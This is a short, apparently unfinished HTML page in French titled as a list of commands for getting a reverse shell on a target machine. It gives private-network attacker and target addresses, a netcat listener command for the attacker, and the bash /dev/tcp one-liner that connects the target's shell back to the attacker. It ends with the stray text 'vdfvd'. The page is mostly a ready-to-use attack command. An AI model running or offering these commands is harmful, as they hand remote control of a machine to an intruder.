<h2>Liste de commandes pour obtenir un reverseshell sur la machine cible</h2>

<ul>(A) Attaquant: 192.168.10.10</ul>
<ul>(C) cible: 192.168.10.100</ul>

<h3>Bash</h3>
(A) # nc -nlv 4444 
<br/>
(C) # bash -i >& /dev/tcp/192.168.10.10/4444 0>&1
<br/>

vdfvd




